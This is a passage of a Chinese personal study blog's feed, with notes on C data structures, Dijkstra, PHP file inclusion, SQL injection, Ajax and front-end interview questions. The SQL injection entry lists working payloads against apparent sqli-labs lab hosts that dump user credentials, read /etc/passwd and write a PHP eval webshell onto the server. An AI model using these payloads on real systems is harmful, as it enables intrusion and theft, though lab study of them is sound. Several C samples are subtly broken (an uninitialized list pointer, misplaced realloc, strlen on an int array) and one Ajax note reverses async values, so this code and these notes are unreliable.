class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_SIZE 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INCREMENT 2</span><br><br>typedef <span class="hljs-built_in">int</span> ElemType;<br>typedef <span class="hljs-keyword">struct</span>&#123;<br>    ElemType *data;<br>    <span class="hljs-built_in">int</span> length;<br>    <span class="hljs-built_in">int</span> list_length;<br>&#125;SqList;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">InitList_Sq</span>(<span class="hljs-params">SqList *L</span>)</span><br>&#123;<br>    L-&gt;data=(ElemType *)malloc(INIT_SIZE*<span class="hljs-keyword">sizeof</span>(ElemType));<br>    <span class="hljs-keyword">if</span>(!L-&gt;data)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    L-&gt;length=<span class="hljs-number">0</span>;<br>    L-&gt;list_length=INIT_SIZE;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">ListInsert</span>(<span class="hljs-params">SqList *L,<span class="hljs-built_in">int</span> index,ElemType temp_data</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> j;<br>    ElemType *newBase;<br>    <span class="hljs-keyword">if</span>(index&lt;<span class="hljs-number">0</span> || index&gt;L-&gt;length)<br>    &#123;<br>        <span class="hljs-comment">//realloc重新分配</span><br>        newBase=(ElemType *)realloc(L-&gt;data,(L-&gt;list_length+INCREMENT)*<span class="hljs-keyword">sizeof</span>(ElemType));<br>        <span class="hljs-keyword">if</span>(!newBase)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        L-&gt;data=newBase;<br>        L-&gt;list_length+=INCREMENT;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=L-&gt;length<span class="hljs-number">-1</span>;j&gt;=index;j--)<br>    &#123;<br>        L-&gt;data[j+<span class="hljs-number">1</span>]=L-&gt;data[j];<br>    &#125;<br>    L-&gt;data[index]=temp_data;<br>    L-&gt;length++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">DeleteList</span>(<span class="hljs-params">SqList *L,<span class="hljs-built_in">int</span> pos</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(pos&lt;<span class="hljs-number">0</span>||pos&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Wrong position.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=pos;index&lt;L-&gt;length;index++)<br>    &#123;<br>        L-&gt;data[index]=L-&gt;data[index+<span class="hljs-number">1</span>];<br>    &#125;<br>    L-&gt;length--;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">FindElem</span>(<span class="hljs-params">SqList *L,ElemType target</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!L-&gt;data)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;Empty table.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(target==L-&gt;data[index])<br>        &#123;<br>            printf(<span class="hljs-string">&quot;Find at %d.\n&quot;</span>,index);<br>            <span class="hljs-keyword">return</span> index;<br>        &#125;<br>    &#125;<br>    printf(<span class="hljs-string">&quot;No such a data.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintList</span>(<span class="hljs-params">SqList *L</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> index=<span class="hljs-number">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class="hljs-string">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span><br>&#123;<br>    SqList *Mylist;<br>    InitList_Sq(Mylist);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> count=<span class="hljs-number">0</span>;count&lt;INIT_SIZE;count++)<br>    &#123;<br>        ListInsert(Mylist,<span class="hljs-number">0</span>,count);<br>    &#125;<br><br>    PrintList(Mylist);<br><br>    DeleteList(Mylist,<span class="hljs-number">3</span>);<br><br>    PrintList(Mylist);<br>    printf(<span class="hljs-string">&quot;Find 2 in %d.\n&quot;</span>,FindElem(Mylist,<span class="hljs-number">2</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>特殊矩阵及广义表</title>
    <link href="/2021/08/08/%E7%89%B9%E6%AE%8A%E7%9F%A9%E9%98%B5%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2021/08/08/%E7%89%B9%E6%AE%8A%E7%9F%A9%E9%98%B5%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//存贮数据的数组</span><br>    <span class="hljs-type">int</span> Myarray[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">20</span>,<span class="hljs-number">17</span>,<span class="hljs-number">4</span>,<span class="hljs-number">23</span>,<span class="hljs-number">14</span>&#125;;<br><br>    <span class="hljs-type">int</span> arryLength=(<span class="hljs-built_in">strlen</span>(Myarray)<span class="hljs-number">-2</span>)/<span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,arryLength);<br>    PrintSymmetricArray(Myarray,arryLength,arryLength);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintSymmetricArray</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-type">int</span> col_index,row_index;<br><br>    <span class="hljs-keyword">for</span>(col_index=<span class="hljs-number">0</span>; col_index&lt;col; col_index++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(row_index=<span class="hljs-number">0</span>; row_index&lt;row; row_index++)<br>        &#123;<br>            <span class="hljs-comment">//转换的坐标为（x(x+1)/2+y）</span><br>            <span class="hljs-keyword">if</span>(col_index&lt;=row_index)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[row_index*(row_index+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+col_index]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[col_index*(col_index+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+row_index]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1.对称矩阵</p><p>2.上三角矩阵</p><p>使用array[0]来存储常数项的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">PrintUpTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index1=<span class="hljs-number">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index2=<span class="hljs-number">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(index1&lt;index2)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[index1*(index1+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+index2]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.下三角矩阵</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">PrintDownTriangle</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-type">int</span> col,<span class="hljs-type">int</span> row)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index1=<span class="hljs-number">0</span>;index1&lt;col;index1++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> index2=<span class="hljs-number">0</span>;index2&lt;row;index2++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(index1&gt;index2)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[index2*(index2+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>+<span class="hljs-number">1</span>+index1]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="/2021/07/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/07/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="一、Defs"><a href="#一、Defs" class="headerlink" title="一、Defs"></a>一、Defs</h2><p>​    可执行的函数被保存在一个单个文件中，使用时直接调用函数。无需再次编写；</p><p>​    由于传入的文件没有经过检验<strong>，动态包含文件</strong>，导入了意料之外的文件导致文件泄露和恶意代码注入；</p><h3 id="1-常用导入函数"><a href="#1-常用导入函数" class="headerlink" title="1.常用导入函数"></a>1.常用导入函数</h3><p>​    include,require,fopen,readfile等；</p><h4 id="（1）include，-require的区别"><a href="#（1）include，-require的区别" class="headerlink" title="（1）include， require的区别"></a>（1）include， require的区别</h4><p>​    include包含文件报错会继续运行，但是require会中断脚本运行；</p><h4 id="（2）include-once（）-require-once"><a href="#（2）include-once（）-require-once" class="headerlink" title="（2）include_once（）,require_once"></a>（2）include_once（）,require_once</h4><p>​    仅包含一次同一个文件，若包含两次就终止脚本；</p><h4 id="（3）-fopen（），readfile（）"><a href="#（3）-fopen（），readfile（）" class="headerlink" title="（3） fopen（），readfile（）"></a>（3） fopen（），readfile（）</h4><p>readfile读取到缓存区，返回一个整数； fopen返回一个指针；</p><h2 id="二、分类"><a href="#二、分类" class="headerlink" title="二、分类"></a>二、分类</h2><h3 id="1-本地文件漏洞（LFI）"><a href="#1-本地文件漏洞（LFI）" class="headerlink" title="1.本地文件漏洞（LFI）"></a>1.本地文件漏洞（LFI）</h3><p>可以包含本地服务器的文件（通过上传传输到服务器），获得权限</p><p>（1）文件在同一文件夹下</p><p>（2）不在同一目录需要使用相对或绝对目录；</p><h4 id="2-方法："><a href="#2-方法：" class="headerlink" title="2.方法："></a>2.方法：</h4><p>%00(PHP5.3.4一下才能使用)；</p><p>重复.././防止字符串替换</p><h3 id="3-远程文件漏洞（RFI）"><a href="#3-远程文件漏洞（RFI）" class="headerlink" title="3.远程文件漏洞（RFI）"></a>3.远程文件漏洞（RFI）</h3><p>类似于代码注入，将一段在外地的代码执行；</p><p>前提：</p><p>（1）allow_url_fopen()    allow_url_include()</p><p>（2）</p><p>（3）</p><p>1=<a href="http://127.0.0.1:82/test.txtz">http://127.0.0.1:82/test.txtz</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入步骤</title>
    <link href="/2021/07/22/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/22/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h3 id="1、找注入点（’-“-）"><a href="#1、找注入点（’-“-）" class="headerlink" title="1、找注入点（’ “ ) ))）"></a>1、找注入点（’ “ ) ))）</h3><p>select * from users where id =’1’#’ limit 0,1;<br><a href="http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#">http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#</a></p><h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><p>select * from users where id =’1’ and 1=1#’ limit 0,1;<br>select * from users where id =’1’ and 1=2#’ limit 0,1;</p><h3 id="3、判断列数"><a href="#3、判断列数" class="headerlink" title="3、判断列数"></a>3、判断列数</h3><p>select * from users where id =’1’ order by 3#’ limit 0,1;</p><h3 id="4、判断显示位"><a href="#4、判断显示位" class="headerlink" title="4、判断显示位"></a>4、判断显示位</h3><p>select * from users where id =’-1’ union select 1,2,3#’ limit 0,1</p><h3 id="5、爆用户、爆库"><a href="#5、爆用户、爆库" class="headerlink" title="5、爆用户、爆库"></a>5、爆用户、爆库</h3><p>select * from users where id =’-1’ union select 1,user(),3#’ limit 0,1<br><a href="http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;">http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),database()–+</p><h3 id="6、爆数据表名"><a href="#6、爆数据表名" class="headerlink" title="6、爆数据表名"></a>6、爆数据表名</h3><p>group_concat()<br>select * from users where id =’-1’ unoin select 1,user(),table_name from information_schema.tables where table_schema=”security” limit 0,1#’ limit 0,1;</p><h3 id="7、爆数据列名"><a href="#7、爆数据列名" class="headerlink" title="7、爆数据列名"></a>7、爆数据列名</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”#’ limit 0,1;<br><a href="http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;">http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”–+</p><h3 id="8、获取数据"><a href="#8、获取数据" class="headerlink" title="8、获取数据"></a>8、获取数据</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(id,username,password) from users#’ limit 0,1;</p><h3 id="9、读取服务器敏感文件"><a href="#9、读取服务器敏感文件" class="headerlink" title="9、读取服务器敏感文件"></a>9、读取服务器敏感文件</h3><p>load_file(“/etc/passwd”)<br>?id=-1’ union select 1,2,load_file(“/etc/passwd”)%23<br>10、获取服务器权限，写入木马<br>?id=-1’ union select 1,2,’<?php eval(\$_POST[123]);?>‘ into outfile ‘/var/www/html/2.php’%23</p><p>select * from users where uname=’admin’#’ and passwd=’123456’</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ajax</title>
    <link href="/2021/04/12/Ajax/"/>
    <url>/2021/04/12/Ajax/</url>
    
    <content type="html"><![CDATA[<h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Asynchronous <span class="hljs-keyword">Javascript </span><span class="hljs-keyword">and </span>XML<span class="hljs-comment">;(异步的javascript和XML)。</span><br></code></pre></td></tr></table></figure><p>✨无须更新整个网页的情况下，更新部分网页；</p><p>传统的网页，需要更新或者提交一个表单，都需要重新加载整个网页；</p><p>增强了B/S（浏览器/服务器）的体验性；</p><p>高可用，更丰富，更动态；</p><h4 id="Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。"><a href="#Ajax的核心：XHR-XMLHttpRequest-能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。" class="headerlink" title="Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。"></a>Ajax的核心：XHR(XMLHttpRequest),能够以异步方式从服务器获取新数据；用于在后台与服务器交换数据。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">variable=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br></code></pre></td></tr></table></figure><p>1.发送请求open和send方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test1.txt&quot;</span>,<span class="hljs-literal">true</span>);<br>xmlhttp.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>open（method，url，async）</td><td>method：GET POST；url:文件在服务器的位置；async：true同步，false异步；</td></tr><tr><td>send（string）</td><td>将请求发送到服务器：string：仅适用于POST</td></tr></tbody></table><p>2.GET 还是 POST？</p><p>与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。</p><p>然而，在以下情况中，请使用 POST 请求：</p><ul><li>无法使用缓存文件（更新服务器上的文件或数据库）</li><li>向服务器发送大量数据（POST 没有数据量限制）</li><li>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</li></ul><p>3.通过 AJAX，JavaScript 无需等待服务器的响应，而是：</p><ul><li>在等待服务器响应时执行其他脚本</li><li>当响应就绪后对响应进行处理</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YK大佬的面试题</title>
    <link href="/2021/04/12/%E5%89%8D%E7%AB%AF/"/>
    <url>/2021/04/12/%E5%89%8D%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="前端面试问题"><a href="#前端面试问题" class="headerlink" title="##前端面试问题"></a>##前端面试问题</h1><h2 id="一、JS"><a href="#一、JS" class="headerlink" title="一、JS"></a>一、JS</h2><p>1.JS中的基础数据类型：  6种，undefined，null，boolean，string，number，symbol；<br>2.let和var的区别    let：有作用域，不会出现变量提升，不与全局环境挂钩；<br>3.this是什么？    this是一种指向，在运行的时候，会指向最后调用它的对象；<br>4.怎么判断一个变量是什么数据类型？<br>typeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；<br>5.ajax    局部更新不刷新整个页面；<br>6.promise基本了解            为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；<br>7.async/await            将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；<br>8.dom操作有哪些？            </p><h2 id="二、CSS"><a href="#二、CSS" class="headerlink" title="二、CSS"></a>二、CSS</h2><p>1.居中，块级和行内<br>行内：text-align：center；<br>块级：首先定义宽度，margin：0，auto；<br>其他方法：父元素display设为flex。加上一句话:justify-content；center；<br>2.垂直居中<br>父元素display设为flex。加上一句话:justify-content；center；align-items：center；<br>3.float布局以及缺点，文档流；<br>缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；<br>4.position的属性有哪些？<br>abosulte:绝对定位  子元素位置根据父元素决定<br>fixed:固定定位     跟据浏览器决定 ，<br>relative：相对定位 根据应该出现的位置定位；<br>5.flex布局          是一个弹性的伸缩盒子模型</p><h2 id="三、vue"><a href="#三、vue" class="headerlink" title="三、vue"></a>三、vue</h2><p>1.组件通信<br>2.为什么子组件的数据需要用函数形式，根组件不用；<br>3.computed/watch的用法和区别；<br>4.router了解</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构</title>
    <link href="/2021/04/09/Dijkstra%E7%AE%97%E6%B3%95/"/>
    <url>/2021/04/09/Dijkstra%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="关于Dijkstra算法"><a href="#关于Dijkstra算法" class="headerlink" title="关于Dijkstra算法"></a>关于Dijkstra算法</h1><p>✔重要</p><h2 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1.基本原理"></a>1.基本原理</h2><p>假设它的起点是 a ，要求它到各点的最短距离</p><p>Dijkstra 思路是维护一个集合 s ，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；</p><p>形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]</p><p>✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；</p><p>先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 n<em>n</em> 次，整个操作就完成了（此处代码中默认起点是1）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">dijkstra</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">127</span>/<span class="hljs-number">3</span>,<span class="hljs-keyword">sizeof</span>(dis));<span class="hljs-comment">//初始化</span><br>    v[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>    dis[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;++i)<br>    &#123;<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;++j)<span class="hljs-comment">//找出距离最近的点</span><br>            <span class="hljs-keyword">if</span>(!v[j]&amp;&amp;(k==<span class="hljs-number">0</span>||dis[j]&lt;dis[k]))<br>                k=j;<br>        v[k]=<span class="hljs-number">1</span>;<span class="hljs-comment">//加入集合</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;++j)<span class="hljs-comment">//松弛</span><br>            <span class="hljs-keyword">if</span>(!v[j]&amp;&amp;dis[k]+a[k][j]&lt;dis[j])<br>                dis[j]=dis[k]+a[k][j];<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 